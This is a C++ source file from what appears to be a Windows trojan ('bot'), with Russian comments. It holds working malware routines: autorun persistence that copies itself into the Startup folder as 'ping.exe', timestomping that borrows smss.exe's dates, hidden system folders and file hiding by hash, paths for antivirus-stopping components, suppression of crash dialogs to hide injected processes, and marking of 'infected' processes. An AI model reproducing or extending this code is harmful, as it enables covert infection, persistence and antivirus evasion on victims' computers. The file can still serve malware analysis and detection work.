
#include <windows.h>
#include <shlobj.h>

#include "GetApi.h"
#include "BotCore.h"
#include "BotUtils.h"
#include "StrConsts.h"


// Максимальный размер имени рабочего каталога
#define MAX_BOT_WORK_FOLDER_LEN 15

// Рабочий каталог бота
char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};





WCHAR BOT_FILE_NAME[] = {'\\','p','i','n','g','.','e','x','e',0};

WCHAR BOT_STOPAV_NAME[] = {'\\','i','g','x','p','d','v','3','2','.','d','a','t', 0};
WCHAR BOT_MINIAV_NAME[] = {'\\','i','g','x','p','g','d','3','2','.','d','a','t', 0};

//DWORD BOT_FILE_HASH = 0xED3D8E99;
//DWORD BOT_CFGN_HASH	= 0xED3DC208;
DWORD BOT_STAV_HASH = 0x551DD093;
DWORD BOT_MNAV_HASH = 0x551B9893;



WCHAR *GetShellFoldersKey( DWORD dwParam )
{
	int dwTemp = 0;

	if ( dwParam == 1 )
	{
		dwTemp = CSIDL_STARTUP;
	}
	else if ( dwParam == 2 )
	{
		dwTemp = CSIDL_APPDATA;
	}

	WCHAR *UserPath = (WCHAR*)MemAlloc( MAX_PATH * sizeof(WCHAR) );

	if ( UserPath == NULL )
	{
		return NULL;
	}

	pSHGetSpecialFolderPathW((HWND)NULL, UserPath, dwTemp, true);

	return UserPath;
}



void SetFakeFileDateTime(PCHAR Path)
{
	WCHAR smss[] = {'\\','s','m','s','s','.','e','x','e',0};

	// Получаем дату и время системмного файла
	WCHAR *SysPath = (WCHAR *)MemAlloc( 512 * sizeof(WCHAR) );

	if (SysPath == NULL)
		return;

	pGetSystemDirectoryW(SysPath, 512);
	plstrcatW( SysPath, smss );

	HANDLE hFile = pCreateFileW( SysPath,  GENERIC_READ,  FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	MemFree( SysPath );
	
	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return;
	}

	FILETIME fl1;
	FILETIME fl2;
	FILETIME fl3;

	pGetFileTime( hFile, &fl1, &fl2, &fl3 );
	pCloseHandle( hFile );

	// Устанавливаем дату бота
	hFile = pCreateFileA(Path,  GENERIC_WRITE,  FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return;
	}

	pSetFileTime( hFile, &fl1, &fl2, &fl3 );
	pCloseHandle( hFile );

	return;
}

void SetFakeFileDateTimeW(PWCHAR Path)
{
	PCHAR FileName = WSTR::ToAnsi(Path, 0);
    SetFakeFileDateTime(FileName);
	STR::Free(FileName);
}


void AddToAutoRun( WCHAR *TempFileName )
{	
	if ( pGetFileAttributesW( TempFileName ) != 0 )
	{
		WCHAR *BotPath = GetShellFoldersKey( 1 );
		if ( BotPath == NULL )
		{
			return;
		}

		plstrcatW( BotPath, BOT_FILE_NAME );

		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

		pCopyFileW( TempFileName, BotPath, FALSE );

		SetFakeFileDateTimeW( BotPath );

		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	
		pDeleteFileW( TempFileName );

		MemFree( BotPath );
	}

	return;
}

void AddToAutoRun(void *body, DWORD size)
{	
	WCHAR *BotPath = GetShellFoldersKey( 1 );
	if ( BotPath == NULL )
	{
		return;
	}

	plstrcatW( BotPath, BOT_FILE_NAME );
	pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

	HANDLE f = pCreateFileW(BotPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD  written = 0;
	if (f != INVALID_HANDLE_VALUE)
	{
		pWriteFile(f, body, size, &written, NULL);
		pCloseHandle(f);
	}

	if (written == size)
	{
		SetFakeFileDateTimeW( BotPath );
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	}

	MemFree( BotPath );
}





WCHAR MiniAVPath[ MAX_PATH ] = {0};

WCHAR *GetMiniAVPath()
{
    PWCHAR Ret = MiniAVPath;

	if (*Ret == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		if ( AppPath  )
		{
			plstrcpyW( MiniAVPath, AppPath		   );
			plstrcatW( MiniAVPath, BOT_MINIAV_NAME );



			MemFree( AppPath );
		}
	}

	return Ret;
}

WCHAR StopAVPath[ MAX_PATH ];

WCHAR *GetStopAVPath()
{

	PWCHAR Ret = StopAVPath;
	if (*Ret == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		WCHAR *Ret = NULL;

		if (AppPath)
		{
			plstrcpyW( StopAVPath, AppPath		   );
			plstrcatW( StopAVPath, BOT_STOPAV_NAME );

			MemFree( AppPath );
		}
	}

	return Ret;
}



WCHAR *GetTempName()
{
	WCHAR *TempPath = (WCHAR*)MemAlloc( 512 );
	WCHAR *FileName = (WCHAR*)MemAlloc( 512 );

	if ( !TempPath || !FileName )
	{
		return NULL;
	}

	pGetTempPathW( 512, TempPath );
	pGetTempFileNameW( TempPath, L"", 0, FileName );

	MemFree( TempPath );

	return FileName;
}

//----------------------------------------------------------------------------

BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
{
	//  Функция возвращает истину, если необходимо спрятать
	//  указанный файл
	//
	// ControlPoint - Информация для отладки

	int Len = FileNameLen / sizeof(WCHAR); // функции передаётся размер буфера а не длина строки

	if (FileName == NULL || FileNameLen == 0)
		return FALSE;

	// Определяем хэш файла
	DWORD Hash = STRW::Hash(FileName, Len, false);

	// Проверяем хэш
	BOOL Hide = BOT::IsHiddenFile(Hash);

	return Hide;
}
//----------------------------------------------------------------------------

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp )
{
	if ( !Path || !Temp )
	{
		return;
	}

	WCHAR *TempPath = GetTempName();

	if ( TempPath == NULL )
	{
		return;
	}

	pCopyFileW( Path, TempPath, FALSE );

	plstrcpyW(Temp, TempPath);

	MemFree( TempPath );

	return;
}


//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog()
{
	// функция устанавливает режим отображения
	// ошибок при котором система не будет отображать сообщение о крахе
	// процесса. Тем самым мы скроем крах запущенных ботом процессов

	pSetErrorMode(SEM_FAILCRITICALERRORS |
				  SEM_NOALIGNMENTFAULTEXCEPT |
				  SEM_NOGPFAULTERRORBOX |
				  SEM_NOOPENFILEERRORBOX);
}




//----------------------------------------------
//  MakeBotPath - Функция возвращает путь к
//  системной папке, где бот будет хранить свои
//  данные
//----------------------------------------------
string BOT::MakeBotPath()
{
	// Создаём путь
	return GetSpecialFolderPathA(CSIDL_APPDATA, NULL);
}

//----------------------------------------------
//  MakeWorkPath Функция создаёт рабочую папку
//               бота и возвращает путь к ней
//  Адрес будет поддиректорией папку адрес
//  которой вернёт функция MakeBotPath()
//----------------------------------------------
string BOT::MakeWorkPath()
{
	// Функция генерирует рабочий путь
	string Result = MakeBotPath();
	Result += MakeWorkFolder();
	Result += "\\";

	if (!DirExists(Result.t_str()))
	{
		pCreateDirectoryA(Result.t_str(), NULL);
		pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
    }
	return Result;
}


//-------------------------------------------
// MakeWorkFolder - Функция генерирует имя
//                  рабочего каталога бота
//                  (короткое имя)
//-------------------------------------------
PCHAR BOT::MakeWorkFolder()
{
	if (!STRA::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// Генерируем имя на основе константы обработанной ключём из уида
	string WorkPath = GetStr(StrBotWorkPath);

	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);

	// Копируем путь в глобальный массив
	const char *Buf = (Name) ? Name : WorkPath.t_str();

	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));

	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
	BOT_WORK_FOLDER_NAME[ToCopy] = 0;

	STR::Free(Name);

	// Добавляем папку в список скрытых файлов
	BOT::AddHiddenFile(STRA::Hash(BOT_WORK_FOLDER_NAME));

	return BOT_WORK_FOLDER_NAME;
}



//----------------------------------------------
//  CreateInfectedProcessHandle
//  Функция создаёт объяект информирования
//  об инфицировании процесса
//----------------------------------------------
HANDLE CreateInfectedProcessHandle(DWORD PID)
{
	if (!PID) PID = Bot->PID();
	string Prefix;
	Prefix.LongToStr(PID);
	Prefix += "PI";
	return TryCreateSingleInstance(Prefix.t_str());
}

//----------------------------------------------
// MarkAsInfcted
// Функция омечает текущий поцесс как
// инфицированный
//----------------------------------------------
void BOT::MarkAsInfcted()
{
	CreateInfectedProcessHandle(0);
}

//----------------------------------------------
//  ProcessInfected
//
//  Функция возвращает истину если процесс с
//  указанными пидом инфицирован
//----------------------------------------------
bool BOT::ProcessInfected(DWORD PID)
{
	// Не уевой объект будет означать, что был создан
    // первый экземпляр
	HANDLE Handle = CreateInfectedProcessHandle(PID);
	bool Result = Handle == NULL;
	pCloseHandle(Handle);
	return Result;
}
